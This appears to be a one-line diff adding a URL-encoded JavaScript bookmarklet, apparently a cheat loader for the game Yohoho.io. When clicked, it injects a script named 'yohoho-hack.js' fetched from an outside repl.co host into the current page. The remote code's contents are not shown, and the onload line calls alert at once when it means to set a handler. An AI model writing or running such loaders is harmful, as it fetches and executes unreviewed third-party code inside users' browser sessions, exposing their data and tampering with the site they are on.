@@ -1,0 +1,1 @@
+javascript:(function()%7B(function() %7Bvar x %3D document.createElement("script")%3Bx.src %3D "https%3A%2F%2Fdiloviolet.nproxy.repl.co%2Fyohoho-hack.js"%3Bx.onload %3D alert("Loaded!")%3Bdocument.head.appendChild(x)%3B%7D)()%7D)()
